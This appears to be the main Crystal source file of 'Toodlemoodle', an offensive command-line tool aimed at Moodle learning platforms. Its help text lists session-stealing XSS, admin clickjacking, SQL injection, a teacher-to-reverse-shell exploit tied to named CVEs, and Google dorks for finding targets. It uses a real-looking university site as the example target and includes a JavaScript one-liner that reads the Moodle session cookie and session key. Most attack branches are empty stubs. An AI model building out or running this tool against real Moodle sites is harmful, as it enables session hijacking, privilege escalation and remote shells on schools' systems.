# TODO: Write documentation for `Toodlemoodle`
require "http/client"
require "option_parser"
require "json"
require "base64"
require "./actions/*"

module Toodlemoodle
  include TMoodleActions
  VERSION = "0.1.0"

  main = Main.new
  main.main

  class Main
    @command = ""
    @target = "undefined"

    # @parser : OptionParser

    def main
      OptionParser.parse! do |parser|
        parser.banner = "Usage: tmoodle command [arguments]\n" \
                        "Commands:\nscan -- Scans the target, revealing the version and vulnerabilities.\n" \
                        "helper -- Prints a JavaScript to help extract your Moodle Session ID, Session Key, and User ID.\n" \
                        "dashboard_xss -- Inserts a session stealer on to your dashboard for the Admin hijack CVE-2019-3847.\n" \
                        "assignment_xss -- Specially crafted URLs to steal sessions using CVE-2017-2578.\n" \
                        "admin_jacker -- Generates a web page to clickjack an administrator account using CVE-2019-3847 dashboard_xss exploit.\n" \
                        "sql_injection -- Exploits CVE-2017-2641 to escalate a user's privelege.\n" \
                        "rce_shell -- Exploits CVE-2018-1133 (must be a teacher) to launch a reverse shell.\n" \
                        "dorks -- Lists some Google dorks useful for finding targets."
        parser.separator("\nArguments:")
        parser.on("-t TARGET", "--target=TARGET", "Moodle target to attack. Do not include a slash at the end! Example: https://ole.unibz.it ") do |str|
          @target = str
        end
        # parser.on("-t NAME", "--to=NAME", "Specifies the name to target (ignore, for ref)") { |name| @destination = name }
        parser.on("-h", "--help", "Show this help message.") { puts parser }
        parser.invalid_option do |flag|
          STDERR.puts "ERROR: #{flag} is not a valid option.\n"
          STDERR.puts parser
          exit(1)
        end
        parser.unknown_args do |args|
          if args.size > 0
            @command = args[0]
          else
            STDERR.puts "ERROR: No command given.\n"
            STDERR.puts parser
            exit(1)
          end
        end
      end

      case @command
      when "scan"
        target_required()
        scanner = Scanner.new
        scanner.perform(@target)
      when "helper"
        puts "Copy and paste this into your DevTools console on an OLE page to extract your own session, session key, and user id.\n\nalert('MoodleSession: ' + document.cookie.match(new RegExp('(^| )MoodleSession=([^;]+)'))[2] + '\\nSessKey: ' + M.cfg.sesskey + '\\nUser id: ' + document.querySelectorAll('[data-userid]')[0].getAttribute('data-userid'))"
      when "dashboard_xss"
        target_required()
        puts "Please enter your session key. Use the helper command."
        sess_key = gets()
        puts "Please visit #{@target}/my/index.php?sesskey=#{sess_key}&bui_addblock=html to add an HTML block to your dashboard. Once the block is added, click on configure, copy the URL, paste it, and hit enter."
        block_edit_url = gets()
        block_regex = block_edit_url.not_nil!.match(/sesskey=(?<sess_key>.*)&bui_editid=(?<edit_id>.*)/)
        session_key = block_regex.try &.["sess_key"]
        block_id = block_regex.try &.["edit_id"]
        puts "Session key: #{session_key}"
        puts "Block id: #{block_id}"
        puts "Please enter an XSS payload to send including <script> tags:"
        payload = gets()
        puts "Sending payload to target..."
      when "assignment_xss"
      when "admin_jacker"
      when "sql_injection"
      when "rce_shell"
      when "dorks"
      else
        STDERR.puts "ERROR: Command \"#{@command}\" given does not exist.\n"
        # STDERR.puts @parser
        exit(1)
      end
      # if !@target
      #   STDERR.puts "ERROR: Please specify a target.\n"
      #   exit(1)
      # else
      #
      # end
    end

    def target_required
      if !@target
        STDERR.puts "ERROR: Please specify a target.\n"
        exit(1)
      end
    end
  end
end
